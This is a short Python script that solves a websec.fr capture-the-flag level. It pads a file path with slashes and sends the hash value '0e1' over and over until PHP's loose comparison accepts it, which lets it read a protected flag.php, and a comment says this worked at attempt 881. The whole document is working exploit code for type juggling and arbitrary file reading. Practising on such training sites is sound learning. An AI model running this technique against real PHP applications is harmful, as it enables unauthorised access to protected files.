import requests

url = 'http://www.websec.fr/level10/index.php'
i = 1
while True:
    print(i)

    # "f" will be .////[omission]/////flag.php, that is always equal to the path of ./flag.php
    # "hash" is always 0e1, which will be equal to $hash after a lot of attempts in loose comparison.
    params = {
        'f': '.' + '/' * i + 'flag.php',
        'hash': '0e1'
    }
    
    # I got the flag at i=881.
    response = requests.post(url, params).text
    if 'Permission denied!' in response:
        i += 1
    else:
        print(response)
        break